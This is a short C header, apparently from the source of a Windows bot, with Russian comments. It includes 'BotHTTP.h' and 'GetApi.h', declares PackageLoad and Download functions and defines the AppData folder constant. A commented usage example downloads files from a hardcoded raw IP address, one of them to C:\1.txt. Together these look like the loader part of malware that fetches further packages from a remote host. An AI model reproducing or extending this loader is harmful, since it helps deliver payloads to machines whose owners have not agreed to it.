#include<windows.h>
#include"GetApi.h"
#include"BotHTTP.h"
#include"Strings.h"
#include"Memory.h"


///необходимые флаги
/*
typedef enum {
    SHGFP_TYPE_CURRENT  = 0,   // current value for user, verify it exists
    SHGFP_TYPE_DEFAULT  = 1,   // default value, may not exist
} SHGFP_TYPE;
*/
#define CSIDL_APPDATA                   0x001a        // <user name>\Application Data
DWORD WINAPI PackageLoad( LPVOID lpData );
void Download(char*URL,WCHAR*FileName);
/*пример использования
/*#include"PackageLoad.h"
int DownloadBigFile()
{
	Download("http://94.240.148.127/test/4.txt",NULL);
//	DownloadInternet("http://94.240.148.127/Download/11.txt0",L"C:\\1.txt",1,NULL,NULL);
	return 0;
}
*/
